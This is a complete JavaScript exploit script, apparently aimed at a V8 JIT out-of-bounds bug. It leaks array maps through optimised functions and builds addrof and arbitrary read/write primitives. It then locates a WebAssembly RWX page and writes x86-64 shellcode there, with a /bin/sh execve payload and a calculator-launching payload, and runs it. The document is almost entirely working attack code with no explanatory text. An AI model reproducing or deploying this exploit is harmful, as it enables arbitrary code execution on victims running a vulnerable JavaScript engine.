class Memory{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
    }
    f2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[0] + tmp[1] * 0x100000000;
    }
    u2f(val){
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
}

mem = new Memory();

var vicbuf;
var oobarr;


function opt(){
    let arr = [1.1, 2, 3, 5];
    let o = {a:4};
    return [arr[o.a],arr];
}

opt();
for (let i=0; i< 100000; i++){
    opt();
}


function opt1(obj) {
    let arr1 = [obj,obj,obj,obj];
    let o = {a:4};
    return arr1;
}



var leak1 = opt();
var leak2 = opt1(new ArrayBuffer(0x430));
var double_map = mem.f2u(leak1[0]);
console.log("[*] Leak double array map is 0x" + double_map.toString(16));
var obj_map = double_map + 160;
console.log("[*] obj array map is 0x" + obj_map.toString(16));

var row_double_map =  mem.u2f(double_map);
var row_obj_map = mem.u2f(obj_map);
console.log(row_double_map);


function prepare_double_map_opt() {
    let arr = [row_double_map,row_double_map,row_double_map,row_double_map];
    let o = {a:4};
    arr[o.a] = row_obj_map;
    return arr;
}
function prepare_double_map() {
    let tmp;
    for (let i = 0; i < 100000; i++){
        tmp = prepare_double_map_opt();
    }
    return tmp[1];
}

double_map_obj = prepare_double_map();


function addreof_opt(obj) {
    let a = [obj,obj,obj,obj];
    let o = {a:4};
    a[o.a] = double_map_obj;
    return a;
}

function addrof(obj) {
    for (let i = 0; i < 100000; i++){
        var tmp = addreof_opt(obj);
    }
    return tmp[0];
}


var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,116,101,115,116,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,32,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.test;

let leakfun = mem.f2u(addrof(f)) ;

function get_array_map() {
    let a = Array(2);
    a[0] = 1.1;
    a[1] = 1.2;
    let b = {a0:1.1,a1:1.2,a2:1.3,a3:1.4,a4:1.5,a5:1.6,a6:1.7,a7:1.8};
    let o = {a:2};
    return [a[o.a], b];
}

var array_mix;
var array_map;

function getarraymap() {
    for (let i = 0; i < 100000; i++){
        var tmp = get_array_map();
    }
    array_mix = tmp[1];
    array_map = tmp[0];
}

getarraymap();
console.log("[*] array map is 0x" + mem.f2u(array_map).toString(16));



function get_vic_obj(){
    let a = [1.1,1.2];
    let o = {a:2};
    a[o.a] = array_map;
    return a;
}

var vic_arraybuff;
var vic_obj;

function getvicobj(){
    for (let i = 0; i < 100000; i++){
       var tmp1 = get_vic_obj();
    }
    vic_arraybuff = new ArrayBuffer(0x430);
    vic_obj = tmp1;
}

getvicobj();

leak_heap = mem.f2u(vic_obj.a5);

console.log("[*] Leak heap addr is 0x" + leak_heap.toString(16));

class ARW {
    read(addr){
        vic_obj.a5 = mem.u2f(addr);
        let tmp = new Float64Array(vic_arraybuff,0,8);
        return mem.f2u(tmp[0]);
    }
    write(addr, data){
        vic_obj.a5 = mem.u2f(addr);
        let tmp = new Float64Array(vic_arraybuff, 0,8);
        tmp.set([mem.u2f(data)])
    }
    writebuf(addr, data){
        vic_obj.a5 = mem.u2f(addr);
        let u8 = new Uint8Array(vic_arraybuff);
        for (let i = 0; i < data.length; i++){
            u8[i] = data[i];
        }
    }
}

arw = new ARW();


console.log("[*] leak function addr is 0x" + leakfun.toString(16));
let shared_info = arw.read(leakfun - 1 + 0x18);
console.log("[*] leak shared_info is 0x" + shared_info.toString(16));
let Wasmdata = arw.read(shared_info - 1 + 0x8);
console.log("[*] leak Wasmdata addr is 0x" + Wasmdata.toString(16));
let instance_addr = arw.read(Wasmdata - 1 + 0x10);
console.log("[*] leak instance addr is 0x" + instance_addr.toString(16));
let rwxmap = arw.read(instance_addr - 1 + 0x80);
console.log("[*] leak rwx map is 0x" + rwxmap.toString(16));

let sc = [0x50,0x48,0x31,0xc0,0x48,0x31,0xd2,0x48,0x31,0xf6,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x54,0x5f,0xb0,0x3b,0x0f,0x05];
let calc = [0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x59, 0x49, 0x81, 0xe9, 0x05, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x01, 0x00, 0x00, 0xbf, 0x6b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb1, 0x61, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x20, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0xb8, 0x51, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x49, 0x8d, 0xb9, 0x62, 0x00, 0x00, 0x00, 0xb8, 0xa1, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x49, 0x8d, 0xb9, 0x64, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x57, 0x48, 0x89, 0xe6, 0x49, 0x8d, 0x91, 0x7e, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x52, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xeb, 0xfe, 0x2e, 0x2e, 0x00, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00];

arw.writebuf(rwxmap, calc);

f();